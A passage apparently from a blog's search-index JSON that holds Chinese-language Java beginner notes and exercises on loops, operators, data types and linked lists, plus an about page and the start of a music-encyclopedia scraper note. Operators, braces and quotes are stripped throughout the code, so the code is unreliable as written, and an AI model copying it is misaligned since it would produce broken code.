m 次，内层循环执行 n 次。此时内层循环的循环体一共执行了 m * n 次 4. 九九乘法表public class NineNineTable public static void main(String[] args) for (int i = 1; i = 9; i++) for (int j = 1; j = i; j++) System.out.print(i + * + j + = + (i * j) + \\t); System.out.println(); 2. break,continue,label 的基本使用1. break,continue 的基本使用 break 和 continue 使用范围 循环中使用的作用(不同点) 相同点 break: switch-case 循环结构中 结束当前循环 关键字后面不能声明执行语句 continue: 循环结构中 结束当次循环 关键字后面不能声明执行语句 2. java 代码public class BreakContinueTest public static void main(String[] args) for(int i = 1;i = 10;i++) if(i % 4 == 0) break;//123 //continue;//123567910 //System.out.println(今晚迪丽热巴要约我！！！); System.out.print(i); System.out.println(); for (int i = 1; i = 4; i++) for (int j = 1; j = 10; j++) if(j % 4 == 0) break; System.out.print(j); System.out.println(); label:for(int i = 1;i = 4;i++) for(int j = 1;j = 10;j++) if(j % 4 == 0) //break label;//结束指定标识的一层循环结构 continue label;//结束指定标识的一层循环结构当次循环 System.out.print(j); System.out.println(); 2. 求 100000 以内的所有质数的输出（逐渐优化）1. 方法 1public class PrimeNumberTest public static void main(String[] args) boolean isFlag = true; for (int i = 2; i = 100; i++) //遍历100以内的自然数 for (int j = 2; j i; j++) //j:被i去除 if (i % j == 0) //i被j除尽 isFlag = false; break; if(isFlag == true) System.out.println(i); isFlag = true; //重置isFlag 2.方法 2public class PrimeNumberTest1 public static void main(String[] args) boolean isFlag = true; int count = 0;//记录质数的个数 long start = System.currentTimeMillis();//时间戳 for (int i = 2; i = 100000; i++) //遍历100以内的自然数 for (int j = 2; j Math.sqrt(i); j++) //j:被i去除 if (i % j == 0) //i被j除尽 isFlag = false; break; if(isFlag == true) //System.out.println(i); count++; isFlag = true; //重置isFlag long end = System.currentTimeMillis();//时间戳 System.out.println(质数的个数为： + count); System.out.println(所花费的时间为： + (end - start));//17110 - 优化一：break:1546 - 优化二：13 3. 方法 3public class PrimeNumberTest2 public static void main(String[] args) int count = 0;//记录质数的个数 long start = System.currentTimeMillis();//时间戳 label:for (int i = 2; i = 100000; i++) //遍历100以内的自然数 for (int j = 2; j Math.sqrt(i); j++) //j:被i去除 if (i % j == 0) //i被j除尽 continue label; //能执行到此步骤的，都是质数 count++; long end = System.currentTimeMillis();//时间戳 System.out.println(质数的个数为： + count); System.out.println(所花费的时间为： + (end - start));//17110 - 优化一：break:1546 - 优化二：13","tags":["Java","学习笔记","基础","嵌套循环"],"categories":["Java学习笔记"]},{"title":"java练习2","path":"//coding/java/exercise/2.html","content":"看不懂的链表public class NodeTest public static void main(String[] args) Node node1 = new Node(1, 李白1, 刺客1); Node node2 = new Node(2, 李白2, 刺客2); Node node3 = new Node(3, 李白3, 刺客3); Node node4 = new Node(4, 李白4, 刺客4); Node node5 = new Node(5, 李白5, 刺客5); Node node6 = new Node(5, 李白, 刺客5); SingleLinkedList singleLinkedList = new SingleLinkedList(); singleLinkedList.add(node1); singleLinkedList.add(node2); singleLinkedList.add(node4); singleLinkedList.add(node5); singleLinkedList.add2(node3); singleLinkedList.delete(3); singleLinkedList.delete(6); singleLinkedList.change(node6); singleLinkedList.change(1, 李白6, 刺客6); singleLinkedList.show(); class SingleLinkedList private Node head=new Node(0, , ); public void add(Node node) Node temp = head; while (true) if (temp.next == null) break; temp = temp.next; temp.next = node; public void add2(Node node) Node temp = head; boolean flag = false; while (true) if (temp.next == null) break; if (temp.next.no node.no) break; else if (temp.next.no == node.no) flag = true; break; temp = temp.next; if (flag) System.out.println(编号已经存在，不能添加); else node.next = temp.next; temp.next = node; public void delete(int no) Node temp = head; boolean flag = false; while (true) if (temp.next == null) break; if (temp.next.no == no) flag = true; break; temp = temp.next; if (flag) temp.next = temp.next.next; else System.out.println(不存在); public void change(int no, String name, String type) if(head.next == null) System.out.println(链表为空); return; Node temp = head.next; boolean flag = false; while (true) if(temp == null) System.out.println(没有找到数据); break; if (temp.no == no) flag = true; break; if (flag) temp.name = name; temp.type = type; public void change(Node node) Node temp = head; //boolean flag = false; delete(node.no); add2(node); public void show() if (head.next == null) System.out.println(该链表为空); return; Node temp = head.next; while (true) if (temp == null) break; System.out.println(temp); temp = temp.next; class Node public int no; public String name; public String type; public Node next; public Node(int no, String name, String type) this.no = no; this.name = name; this.type = type; @Override public String toString() return Node + no= + no + , name= + name + \\ + , type= + type + \\ + ;","tags":["Java","进阶","链表","node"],"categories":["Java练习"]},{"title":"java学习笔记5","path":"//coding/java/note/5.html","content":"程序流程控制 顺序结构 分支结构 循环结构 输入 Scanner 具体步骤 导包：import java.util.Scanner; Scanner 的实例化:Scanner scan new Scanner(System.in); 调用 Scanner 类的相关方法（next() nextXxx()），来获取指定类型的变量 java 代码 //1.导包：import java.util.Scanner;import java.util.Scanner;public class ScannerTest public static void main(String[] args) //2.Scanner的实例化 Scanner scan = new Scanner(System.in); //3.调用Scanner类的相关方法 System.out.println(请输入姓名：); String name = scan.next(); System.out.println(name); System.out.println(请输入你的芳龄：); int age = scan.nextInt(); System.out.println(age); System.out.println(请输入); double weight = scan.nextDouble(); System.out.println(weight); System.out.println(你是否相中我了呢？(true/false)); boolean isLove = scan.nextBoolean(); System.out.println(isLove); //对于char型的获取，Scanner没有提供相关的方法。只能获取一个字符串 System.out.println(请输入你的性别：(男/女)); String gender = scan.next(); char genderChar = gender.charAt(0);//获取索引为0位置上的字符 System.out.println(genderChar); 3. Tip:需要根据相应的方法，来输入指定类型的值。如果输入的数据类型与要求的类型不匹配时，会报异常：InputMisMatchException，导致程序终止。 1. 分支结构(if——else)1. 三种结构第一种： if(条件表达式) 执行表达式 第二种：二选一 if(条件表达式) 执行表达式1else 执行表达式2 第三种：n 选一 if(条件表达式) 执行表达式1else if(条件表达式) 执行表达式2else if(条件表达式) 执行表达式3...else 执行表达式n 2. java 代码public class IfTest public static void main(String[] args) int heartBeats = 67; if(heartBeats 60 || heartBeats 100) System.out.println(需要进一步检查); System.out.println(检查结束); int age = 23; if(age 18) System.out.println(可以看动画片了); else System.out.println(可以看大动画片了); if(age 0) System.out.println(输入的数据非法); else if(age 18) System.out.println(青少年模式); else if(age 35) System.out.println(青壮年模式); else if(age 60) System.out.println(中年模式); else if(age 120) System.out.println(老年模式); else if(age 120) System.out.println(成仙模式); 3. Tip else 结构是可选的。 针对于条件表达式： 如果条件表达式之间没有交集的关系,判断和执行语句声明与在上面还是下面无关。 如果条件表达式之间有交集的关系，需要根据实际情况，考虑清楚应该将哪个结构声明在上面。 如果条件表达式之间有包含的关系，需要将范围小的声明在范围大的上面。否则，范围小的就不会执行了。 if-else 结构是可以相互嵌套的。 if-else 结构中的执行语句只有一行时，对应的{}可以省略的。但是，不建议大家省略。 2. 分支结构(switch-case)1. 结构switch(表达式)case 常量1: 执行语句1; //break;case 常量2: 执行语句2; //break;...default: 执行语句n; //break; 2. java 代码public class SwitchCaseTest public static void main(String[] args) String season = summer; switch (season) case spring: System.out.println(春暖花开); break; case summer: System.out.println(夏日炎炎); break; case autumn: System.out.println(秋高气爽); break; case winter: System.out.println(冬雪皑皑); break; default: System.out.println(季节输入有误); break; //从键盘分别输入年、月、日，判断这一天是当年的第几天import java.util.Scanner;public class SwitchCaseExer public static void main(String[] args) Scanner scan = new Scanner(System.in); System.out.println(请输入year：); int year = scan.nextInt(); System.out.println(请输入month：); int month = scan.nextInt(); System.out.println(请输入day：); int day = scan.nextInt(); //定义一个变量来保存总天数 int sumDays = 0; switch(month) case 12: sumDays += 30; case 11: sumDays += 31; case 10: sumDays += 30; case 9: sumDays += 31; case 8: sumDays += 31; case 7: sumDays += 30; case 6: sumDays += 31; case 5: sumDays += 30; case 4: sumDays += 31; case 3: if((year % 4 == 0 year % 100 != 0) || year % 400 == 0) sumDays += 29; else sumDays += 28; case 2: sumDays += 31; case 1: sumDays += day; System.out.println(year + month + 月 + day + 日是当年的第 + sumDays + 天); 3. Tip 根据 switch 中的值，依次匹配各个 case 中的常量。匹配成功后，则进入相应 case 中。当调用完执行语句以后，则仍然继续向下执行其他 case 结构中的执行语句，直到遇到 break 关键字或此 switch-case 结构末尾结束为止。 break 在 switch-case 结构中，表示遇到此关键字后，就跳出 switch-case 结构 switch 结构中的表达式，只能是如下的 6 种数据类型之一：byte 、short、char、int、枚举类型(JDK5.0 新增)、String 类型(JDK7.0 新增) case 后面只能放常量，不能放范围。（case age 18:） break 关键字是可选的。 default:相当于 if-else 结构中的 else。default 结构是可选的，而且位置是灵活的。 凡是可以使用 switch-case 的结构，都可以用 if-else。反之，不成立。 我们写分支结构时，当发现既可以使用 switch-case,（而且，switch 中表达式的取值情况不太多），又可以使用 if-else 时，我们优先用 switch-case。原因：switch-case 执行效率稍高。 3. 循环结构（for 循环）1. 结构① 初始化条件② 循环条件 ---是boolean类型③ 循环体④ 迭代条件for(①;②;④) ③执行过程：① - ② - ③ - ④ - ② - ③ - ④ - ... - ② 2.java 代码public class ForTest public static void main(String[] args) for (int i = 0; i 5; i++) System.out.println(i + hello world); int num = 1; //abcbcbc for(System.out.print(a); num = 3; System.out.print(c), num++) System.out.print(b); System.out.println(); //遍历100以内的偶数,输出所有偶数的和,输出偶数的个数 int sum = 0; int count = 0; for (int i = 1; i = 100; i++) if(i % 2 == 0) //System.out.println(i); sum += i; count++; System.out.println(总和为： + sum); System.out.println(个数为： + count); 4. 循环结构（while 循环）1. 结构① 初始化条件② 循环条件 ---是boolean类型③ 循环体④ 迭代条件①while(②) ③; ④;执行过程：① - ② - ③ - ④ - ② - ③ - ④ - ... - ② 2. java 代码public class WhileTest public static void main(String[] args) int i = 2; while (i = 100) if(i % 2 == 0) System.out.println(i); i++; //循环外，仍然有i System.out.println(i);//101 3.Tip 写 while 循环记得要写迭代条件。一旦丢了，就可能导致死循环，我们要避免出现死循环。 for 循环和 while 循环是可以相互转换的！区别：for 循环和 while 循环的初始化条件部分的作用范围不同。 5. 循环结构（do while 循环）1. 结构① 初始化条件② 循环条件 ---是boolean类型③ 循环体④ 迭代条件①do ③; ④;while(②);执行过程：① - ③ - ④ - ② - ③ - ④ - ... - ② 2. java 代码public class DoWhileTest public static void main(String[] args) //遍历100以内的偶数,并计算所有偶数的和及偶数的个数 int num = 1; int sum = 0; int count = 0; do if(num % 2 == 0) System.out.println(num); sum += num; count++; num++; while (num = 100); System.out.println(总和为： + sum); System.out.println(个数为： + count); //do-while至少执行一次循环体 int number1 = 10; while (number1 10) System.out.println(while); number1--; int number2 = 10; do System.out.println(do_while); number2--; while (number2 10); 3. Tip do-while 循环至少会执行一次循环体！ 开发中，使用 for 和 while 更多一些。较少使用 do-while 6. 最简单“无限” 循环格式while(true) , for(;;),无限循环存在的原因是并不知道循环多少次，需要根据循环体内部某些条件，来控制循环的结束。 //从键盘读入个数不确定的整数，并判断读入的正数和负数的个数，输入为0时结束程序。import java.util.Scanner;public class ForWhileTest public static void main(String[] args) Scanner scanner = new Scanner(System.in); int positiveNumber = 0; //正数的个数 int negativeNumber = 0; //负数的个数 while (true) //for (;;) int number = scanner.nextInt(); if(number 0) positiveNumber++; else if(number 0) negativeNumber++; else break; System.out.println(正数: + positiveNumber); System.out.println(负数： + negativeNumber); 结束方法 循环条件部分返回 false 在循环体中，执行 break","tags":["Java","学习笔记","基础","循环","选择"],"categories":["Java学习笔记"]},{"title":"java学习笔记4","path":"//coding/java/note/4.html","content":"一. 运算符 算术运算符赋值运算符比较运算符（关系运算符）逻辑运算符位运算符三元运算符 1. 算术运算符1. 常用的算术运算符 运算符 运算 范例 结果 + 正号 +3 3 - 负号 b4; -b -4 + 加 5+5 10 - 减 6-4 2 * 乘 3*4 12 除 55 1 % 取模(取余) 7%5 2 ++ 自增（前）：先运算后取值 a2;b++a; a3;b3 ++ 自增（后）：先取值后运算 a2;ba++; a3;b2 - - 自减（前）：先运算后取值 a2;b- -a a1;b1 - - 自减（后）：先取值后运算 a2;ba- - a1;b2 + 字符串连接 “He”+”llo” “Hello 2. 除法运算 java 代码public class AriTest public static void main(String[] args) int num1 = 12; int num2 = 5; int result1 = num1 / num2; System.out.println(result1); //2 int result2 = num1 / num2 * num2; System.out.println(result2); //10 double result3 = num1 / num2; System.out.println(result3); //2.0 double result4 = num1 / (num2 + 0.0); //2.4 System.out.println(result4); double result5 = (double) num1 / num2; //2.4 System.out.println(result5); 2. 取余运算 %1. java 代码public class AriTest public static void main(String[] args) //取余运算 % System.out.println(12 % 5 = + 12 % 5); //2 System.out.println(-12 % 5 = + -12 % 5); //-2 System.out.println(12 % -5 = + 12 % -5); //2 System.out.println(-12 % -5 = + -12 % -5); //-2 2. Tip 结果的符号与被模数(前面那个)的符号相同。 经常使用%来判断能否被除尽的情况。 3. 前后自增（减） ++ –1.运算规则 (前)++ :先自增 1，后运算(后)++ :先运算，后自增 1(前)– :先自减 1，后运算(后)– :先运算，后自减 1自增 1 不会改变本身的数据类型 2. java 代码public class AriTest public static void main(String[] args) //a++ ++a int a1 = 10; int b1 = ++a1; System.out.println(a1 = + a1 + ,b1 = + b1);//11 11 int a2 = 10; int b2 = a1++; System.out.println(a2 = + a2 + ,b2 = + b2);//10 11 int a3 = 10; //这样子两个都是一样的 ++a3;//a3++; short s1 = 10; s1 = (short) (s1 + 1); //这个是可以的 System.out.println(s1); //11 s1++; //自增1不会改变本身的数据类型 System.out.println(s1); //12 //--a a-- int a4 = 10; int b4 = --a4; System.out.println(a4 = + a4 + ,b4 = + b4); //9 9 2. 赋值运算符1. java 代码public class SetValueTest public static void main(String[] args) int i1 = 10; int j1 = 10; int i2 = 10, j2 = 20; //int i3 = j3 = 10; 这个不行 int i3, j3; //连续赋值 i3 = j3 = 10; int num1 = 10; num1 += 2; System.out.println(num1); //12 short s1 = 10; //s1 = s1 + 2;//编译失败 s1 += 2;//结论：不会改变变量本身的数据类型 System.out.println(s1); //12 int n1 = 10; n1 += (n1++) + (++n1);//n1 = n1 + (n1++) + (++n1); System.out.println(n1);//32 2. Tip 支持连续赋值。扩展赋值运算符： +, -, *, , %不会改变变量本身的数据类型 3. 比较运算符1. 常用的比较运算符 运算符 运算 范例 结果 相等于 43 false ! 不等于 4!3 true 小于 43 false 大于 43 true 小于等于 43 false 大于等于 43 true instanceof 检查是否是类的对象 “Hello” instanceof String true 2. java 代码public class CompareTest public static void main(String[] args) int i = 10; int j = 20; System.out.println(i == j); //false System.out.println(i = j); //20 boolean b1 = true; boolean b2 = false; System.out.println(b2 == b1); //false System.out.println(b2 = b1); //true 3. Tip 比较运算符的结果是 boolean 类型区分 和 4.逻辑运算符1. 常用的逻辑运算符 —逻辑与| —逻辑或! —逻辑非 —短路与|| —短路或^ —逻辑异或 2.运算规则 a b ab ab ab ab !a a^b true true true true true true false false true false false false true true false true false true false false true true true true false false false false false false true false 3.结论 与：一假则假 或：有真则真 非：取反 异或：一样则假，不一样则真 4. java 代码public class LogicTest public static void main(String[] args) //相同点： 与 的运算结果相同 //当符号左边是true时，二者都会执行符号右边的运算 //当符号左边是false时，继续执行符号右边的运算。不再执行符号右边的运算。 //开发中，推荐使用 boolean b1 = true; b1 = false; int num1 = 10; if(b1 (num1++ 0)) System.out.println(我现在在北京); else System.out.println(我现在在南京); //这个 System.out.println(num1 = + num1); //11 boolean b2 = true; b2 = false; int num2 = 10; if(b2 (num2++ 0)) System.out.println(我现在在北京); else System.out.println(我现在在南京); //这个 System.out.println(num2 = + num2); //10 //相同点：| 与 || 的运算结果相同 //当符号左边是false时，二者都会执行符号右边的运算 //当符号左边是true时，|继续执行符号右边的运算，而||不再执行符号右边的运算 //开发中，推荐使用|| boolean b3 = false; b3 = true; int num3 = 10; if(b3 | (num3++ 0)) System.out.println(我现在在北京); //这个 else System.out.println(我现在在南京); System.out.println(num3 = + num3); //11 boolean b4 = false; b4 = true; int num4 = 10; if(b4 || (num4++ 0)) System.out.println(我现在在北京); //这个 else System.out.println(我现在在南京); System.out.println(num4 = + num4); //10 5. Tip逻辑运算符操作的都是 boolean 类型的变量 5. 位运算符(直接对整数的二进制进行的运算)1. 常见的位运算符 运算符 运算 范例 左移 3 2 12 – 32212 右移 3 1 1 – 321 无符号右移 3 1 1 – 321 与运算 6 3 2 或运算 6 3 7 ^ 异或运算 6 ^ 3 5 ~ 取反运算 ~6 -7 2. 位运算符的细节 位运算符 细节 空位补 0，被移除的高位丢弃，空缺位补 0。 被移位的二进制最高位是 0，右移后，空缺位补 0；最高位是 1，空缺位补 1。 被移位二进制最高位无论是 0 或者是 1，空缺位都用 0 补。 二进制位进行运算，只有 11 时结果是 1，否则是 0; 二进制位进行 运算，只有 0 0 时结果是 0，否则是 1; ^ 相同二进制位进行 ^ 运算，结果是 0；1^10 , 0^00 。 不相同二进制位 ^ 运算结果是 1。1^01 , 0^11 ~ 正数取反，各二进制码按补码各位取反。负数取反，各二进制码按补码各位取反 3. java 代码public class BitTest public static void main(String[] args) int i = 21; //i = -21; System.out.println(i 2 : + (i 2)); System.out.println(i 3 : + (i 3)); System.out.println(i 27 : + (i 27)); int m = 12; int n = 5; //写成二进制，1表示true，表示false System.out.println(m n : + (m n)); //4 System.out.println(m | n : + (m | n)); //13 System.out.println(m ^ n : + (m ^ n)); //9 System.out.println(~m: + (~m)); //-13 符号位也取反 4. Tip 位运算符操作的都是整型的数据 ：在一定范围内，每向左移 1 位，相当于 * 2 :在一定范围内，每向右移 1 位，相当于 2 6. 三元运算符1. 结构：(条件表达式)? 表达式 1 : 表达式 22.java 代码public class SanYuanTest public static void main(String[] args) //取最大值 int m = 12; int n = 5; int max = (m n) ? m : n; //12 System.out.println(max); double num = (m n)? 2 : 1.0; //(m n)? 2 : n大;//编译错误 n = 12; String maxStr = (m n)? m大 : ((m == n)? m和n相等 : n大); System.out.println(maxStr); //获取三个的最大值 int n1 = 12; int n2 = 30; int n3 = -43; int max1 = (n1 n2)? n1 : n2; int max2 = (max1 n3)? max1 : n3; System.out.println(三个数中的最大值为： + max2); 3. Tip 条件表达式的结果为 boolean 类型. 根据条件表达式真或假，true 则表达式 1，false 则表达式 2. 表达式 1 和表达式 2 数据类型. 要求是一致的。 三元运算符可以嵌套使用. 可以使用三元运算符的地方，都可以改写为 if-else，不能反过来. 如果既可以三元运算符，又可以 if-else 结构，那么优先三元运算符。原因：简洁、执行效率高。 2. 运算符优先级（从上到下由高到低） .() {} ; , R—L ++ – ~ !(data type) L—R * % L—R + - L—R L—R instanceof L—R ! L—R L—R ^ L—R L—R L—R R—L ? : R—L * % + - ^ 优先用括号 只有单目运算符、三元运算符、赋值运算符是从右向左运算的。","tags":["Java","学习笔记","基础","运算符"],"categories":["Java学习笔记"]},{"title":"java学习笔记3","path":"//coding/java/note/3.html","content":"一. 字符串 String（字符串）属于引用数据类型 声明 String 是，需要一对双引号”” String 可以和 8 种基本数据类型做运算，而且只能是连接运算 + ，结果为 String public class StringTest public static void main(String[] args) char c = a; int num = 10; String str = hello; //加法是从左加到右，String + int 得 String System.out.println(c + num + str); //107hello System.out.println(c + (num + str)); //a10hello System.out.println(c + str + num); //ahello10 System.out.println(str + num + c); //hello10a //注意 + 可以数字加，也可以连接 //做运算用单引号，做字符串拼接用双引号 System.out.println(* *); //* * System.out.println(* + \\t + *); //97 System.out.println(* + \\t + *); //* * System.out.println(* + \\t + *); //* * System.out.println(3.5f + ); //3.5 字符串 String str1 = 123 + ; //int num1 = (int)str1; //str 不能转换成 int int num1 = Integer.parseInt(str1); System.out.println(num1); //123 二. 进制1. 常用的进制 二进制(binary)：0,1 ，满 2 进 1.以 0b 或 0B 开头。十进制(decimal)：0-9 ，满 10 进 1。八进制(octal)：0-7 ，满 8 进 1. 以数字 0 开头表示。十六进制(hex)：0-9 及 A-F，满 16 进 1. 以 0x 或 0X 开头表示。此处的 A-F 不区分大小写。 2. java 代码public class BinaryTest public static void main(String[] args) int num1 = 0b110; int num2 = 110; int num3 = 0127; int num4 = 0x110A; System.out.println(num1= + num1); //6 System.out.println(num2= + num2); //110 System.out.println(num3= + num3); //87 System.out.println(num4= + num4); //4362 3. 二进制转换成十进制(原码，反码，补码)14为0 0 0 0 1 1 1 01 * 2^3 + 1 * 2^2 + 1* 2^1 = 14正数三码合一-14为，首位取 1 表示负数1 0 0 0 1 1 1 0 -14的原码除符号位外，各个位取反1 1 1 1 0 0 0 1 -14的反码反码+11 1 1 1 0 0 1 0 -14的补码计算机底层都以补码的方式来存储数据！ 2. 十进制转换成二进制（除 2 取余的逆）13 - 16 - 03 - 11 - 10 - 0从下往上读：1101","tags":["Java","学习笔记","基础","进制"],"categories":["Java学习笔记"]},{"title":"java学习笔记2","path":"//coding/java/note/2.html","content":"一. 标识符1. 标识符的使用例如：类名，变量名，方法名，接口名，包名2. 标识符的命名规则（不遵守直接报错） 由 26 个英文字母大小写，0-9 ，_或 $ 组成。 数字不可以开头。 不可以使用关键字和保留字，但能包含关键字和保留字。 Java 中严格区分大小写，长度无限制。 标识符不能包含空格。 3. 命名规范（遵守不会报错） 包名：多单词组成时所有字母都小写：xxxyyyzzz 类名、接口名：多单词组成时，所有单词的首字母大写：XxxYyyZzz 变量名、方法名：多单词组成时，第一个单词首字母小写，第二个单词开始每个单词首字母大写：xxxYyyZzz 常量名：所有字母都大写。多单词时每个单词用下划线连接：XXX_YYY_ZZZ 4. 关键字和保留字1. 注意保留字都是小写2. 关键字查看网站：https://docs.oracle.com/javase/tutorial/java/nutsandbolts/_keywords.html3. 保留字：goto 、const5.Tip 为了提高阅读性，起名字要“见名知意”。 java 采用 unicode 字符集，也可以使用汉字声明，但是不建议使用。 二. 变量1. 定义变量的格式数据类型 变量名 变量值;int var 10;2. 变量的分类按数据类型 基本数据类型 数值型 整数类型 (byte \\ short \\ int \\ long) 浮点类型 (float \\ double) 字符型 (char) 布尔型 (boolean) 引用数据类型 类 (class) (字符串在这里) 接口 (interface) 数组 (array) 按声明的位置(后面细讲) 成员变量 局部变量 3. 整数1. 整数类型 类 型 占用存储空间 表数范围 byte 1 字节8bit 位 -128 ~ 127 short 2 字节 -215 ~215-1 int 4 字节 -231 ~ 231-1 (约 21 亿) long 8 字节 -263 ~ 263-1 2. 声明 long 型后面加‘l’或‘L’，不加则默认为 int 型。(long l1 1234567890L)4.浮点1. 浮点类型 类 型 占用存储空间 表数范围 单精度 float 4 字节 -3.403E38 ~ 3.403E38 双精度 double 8 字节 -1.798E308 ~ 1.798E308 2. 声明 float 型后面加‘f’或‘F’，不加则默认为 double 型。(float f1 12.3F)3. float 表示的数值范围比 long 大5. 字符1. 字符类型 类 型 占用存储空间 char 2 字节 2. 定义使用单引号 ‘’ (char c1 ‘a’)3. 三种表现形式 一个字符（数字也算字符） 转义字符（ \\t） 直接用 Unicode 值来表示字符型常量 (\\u0043) 5. 布尔类型1. 只允许取值 true 和 false。2. 通常在条件判断，循环结构中使用。6. Tip 变量必须先声明，后使用。 变量都定义在其作用域内。出了作用域，则失效。 同一个作用域内，不可以声明两个同名的变量。 三. 基本数据类型的运算规则1. 自动类型提升当容量小的数据类型的变量和容量大的做运算时，结果自动提升为容量大的byte , short , char - int - long - float - double当 byte , short , char 做运算时结果都是 int2. 强制类型转化（自动类型提升的逆运算）1. 需要使用强转符：（）2. 强制转化类型，可能有精度损失 被截断了 数据溢出","tags":["Java","学习笔记","基础","关键字","变量"],"categories":["Java学习笔记"]},{"title":"java练习1","path":"//coding/java/exercise/1.html","content":"一.例题1.打印三角形效果： 代码：public class triangle public static void main(String[] args) //public private for (int i = 0; i 5; i++) for (int j = 0; j = i; j++) System.out.print(*); System.out.println(); 结果：*************** 2.打印三角形 pro效果： 代码 1：在第一个的基础上另外循环一次，补出来下面的部分public class trianglepro public static void main(String[] args) for (int i = 0; i 5; i++) for (int j = 0; j = i; j++) System.out.print(*); System.out.println(); for (int i = 4; i 0; i--) for (int j = 0; j i; j++) System.out.print(*); System.out.println(); 代码 2：使用绝对值（有点难）public class trianglepro public static void main(String[] args) for (int i = 0; i 5*2-1; i++) //Math.abs（） 绝对值 for (int j = 0; j 5 - Math.abs(4-i); j++) System.out.print(*); System.out.println(); 结果：************************* 3.打印三角形 promax效果： 代码：public class trianglepromax public static void main(String[] args) for (int i = 0; i 5*2-1; i++) for (int j = 0; j Math.abs(4-i); j++) System.out.print( ); for (int j = 0; j (5-Math.abs(4-i))*2 - 1; j++) System.out.print(i%2); System.out.println(); 结果： 0 111 00000 1111111 1111111 00000 111 0 4.打印三角形 promax 远峰蓝（很离谱）效果 代码：import java.awt.*;import javax.swing.JLabel ;import javax.swing.JFrame ;public class TriangleProMaxSierraBlue public static void main(String args[]) JFrame frame = new JFrame(TriangleProMaxSierraBlue) ; frame.setLayout(new FlowLayout()); String str=; for(int i=0;i5*2-1;i++) for(int j=0;jMath.abs(4-i);j++) str+= ; for(int j=0;j(5-Math.abs(4-i))*2-1;j++) str+=i%2; //这里补齐了后面的空格 for(int j=0;jMath.abs(4-i);j++) str+= ; JLabel lab = new JLabel(str,JLabel.CENTER) ; // 实例化标签对象 Font font = new Font(宋体, Font.PLAIN, 25); lab.setFont(font); lab.setForeground(new Color(173,198,220));; frame.add(lab) ; // 将组件件入到面板之中 str=; Dimension dim = new Dimension() ; dim.setSize(200,350) ; //窗体的大小 frame.setSize(dim) ; //设置窗体大小 Point point = new Point(500,100) ; // 设置坐标 frame.setLocation(point) ; //设置窗体坐标 frame.setVisible(true) ; //设置窗体可见 结果：就是上面的图片，不再重复5.打印三角形（输入版）代码：import java.util.Scanner;public class triangle_input public static void main(String[] args) //这里是输入 Scanner input = new Scanner(System.in); int num = input.nextInt(); for (int i = 0; i num; i++) for (int j = 0; j i + 1; j++) System.out.print(*); System.out.println(); 结果：********** 2.面试题（看不懂，一脸懵逼）题目：/*有一个方阵，方阵中有男生0和女生1。一个女生上、下、左、右的女生与她本人同属于一朵花。方阵中有多少花？*/public class flowerNumber public static void main(String[] args) int[][] studentCube=0,0,1,1,1, 1,0,1,0,0, 1,1,1,0,1, 0,0,0,0,0, 1,1,0,1,1; System.out.print(Number of flowers is +solution(studentCube)); public static int solution(int[][] studentCube) int flowerNum=0; //输入内容 return flowerNum; 代码：（用到了迭代，看不懂啊）这个是彬酱的有关迭代的递归和迭代public class flowerNumber public static void main(String[] args) int[][] studentCube=0,0,1,1,1, 1,0,1,0,0, 1,1,1,0,1, 0,0,0,0,0, 1,1,0,1,1; System.out.print(Number of flowers is +solution(studentCube)); public static int solution(int[][] studentCube) int flowerNum=0; for(int i=0;i5;i++) for(int j=0;j5;j++) if(studentCube[i][j]==0) continue; flowerNum++; tagFemaleToMale(studentCube,i,j); return flowerNum; public static void tagFemaleToMale(int[][] studentCube,int i,int j) studentCube[i][j]=0; if(i4) if(studentCube[i+1][j]==1) tagFemaleToMale(studentCube,i+1,j); if(j4) if(studentCube[i][j+1]==1) tagFemaleToMale(studentCube,i,j+1); if(i0) if(studentCube[i-1][j]==1) tagFemaleToMale(studentCube,i-1,j); if(j0) if(studentCube[i][j-1]==1) tagFemaleToMale(studentCube,i,j-1); 结果：Number of flowers is 4 三.总结 要加快进度看视频啊，要来不及了 很多绝对值那里需要再看看 递归和迭代搞不懂，有机会就学","tags":["Java","基础"],"categories":["Java练习"]},{"title":"java学习笔记1","path":"//coding/java/note/1.html","content":"一.软件开发时常见 DOS 命令dir : 列出当前目录下的文件以及文件夹md : 创建目录rd : 删除目录cd : 进入指定目录cd.. : 退回到上一级目录cd\\: 退回到根目录del : 删除文件exit : 退出 dos 命令行 二.第一个程序编写（helloworld）public class helloworld public static void main(String[] args) System.out.println(hello, world!); 输出结果：hello, world! 三.java 程序进行 编译：javac + 程序名称.java 运行：java + 程序名称（注意大小写） 四.Java 注释1. 单行注释（和 C 一样）public class helloworld public static void main(String[] args) //这个是程序入口 //args（arguments）参数名字，可以改变 //括号里面可以写成 String args[] 但是比较少见 System.out.println(hello, world!); //下一语句输出到控制台，先输出后换行 System.out.print(hello, world!); //这句话不换行 2. 多行注释（和 C 一样）/*多行注释不可以嵌套使用这里是多行注释这里也是多行注释*/ 3. 文档注释 (java 特有)/**@author 指定java程序的作者@version 指定源文件的版本 这里可以写中文*/ 单行注释和多行注释 作用： 增强可读性 方便调试 特点：不参与编译。 文档注释 内容可以被 javadoc 解析，生成一套以网页文件形式体现的该程序的说明文档。 使用方法：javadoc -d mydoc(文件名) -author -version Helloworld.java(文件名）-encoding utf-8 只有文档注释可以被 javadoc 读取，单行注释和多行注释不行 五.Java api 文档介绍了如何使用 java 的类。 下载地址 : http://www.oracle.com/technetwork/java/javase/downloads/index.html 六.Tip 一个 java 文件里面可以有多个 class，但是最多只有一个类声明为 public。 要求声明为 public 的类的类名必须宇源文件名相同。 程序的入口是 main 方法，格式是固定的。 编译以后会生成 1 个或多个 class 文件，字节码文件的文件名要与 java 源文件中的类名一致。 每一行都以 ; 结束。","tags":["Java","学习笔记"],"categories":["Java学习笔记"]},{"title":"关于Typecho Blog","path":"//about/Typecho_Blog.html","content":"这里是 bandao 的 Typecho 个人主页啊，使用的 joe 主题（主要是最近正在学 java，用 markdown 做笔记，wordpress 原生不支持，就用 Typecho）此博客主要存放我的 java 我的 B 站主页：半岛的孤城我的大破站：半岛的孤城我的网盘：半岛的孤城"},{"title":"【Dropin】Dropin多频百科爬虫","path":"//coding/python/dropin_wiki.html","content":"多频百科 api：视频使用教程 例子：http://duopin_app_api.hearinmusic.com/app/ency/encyDetail?typeId=13dataId=377# GET方法url = http://duopin_app_api.hearinmusic.com/app/ency/encyDetail?params = typeId:str(typeId), dataId:str(dataId)# typeId和中文对应的关系typeId_dict = 12:艺人,#(最大10000+) 13:风格,#(最大379) 14:厂牌,#(最大1933) 15:场所,#(最大40) 16:电音节,#(最大200) 17:事件,#(最大3) 11:其他#(最大45)dataId的json放在了dataId_json文件夹中 爬虫主体在 wiki_main.py（获取多频百科的列表）和 